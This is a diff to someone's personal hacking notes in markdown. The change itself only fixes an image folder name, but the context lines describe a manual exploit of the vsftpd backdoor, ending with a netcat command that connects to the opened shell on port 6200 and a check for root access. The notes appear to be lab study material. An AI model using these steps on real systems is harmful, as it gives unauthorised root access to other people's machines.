@@ -6,5 +6,5 @@ The “Manual” Hack (When Metasploit fails):
 - Password: anypassword
 - In a New terminal, connect to the backdoor: nc -nv <Target_IP> 6200
 - Test access: Type “whoami”. If it says root, you're in!
-![vsftpd Step 1](../Hacking-Noted(images)/vsftpd%201.png)
-![vsftpd Step 2](../Hacking-Noted(images)/vsftpd%202.png)
+![vsftpd Step 1](../Hacking-Notes(images)/vsftpd%201.png)
+![vsftpd Step 2](../Hacking-Notes(images)/vsftpd%202.png)
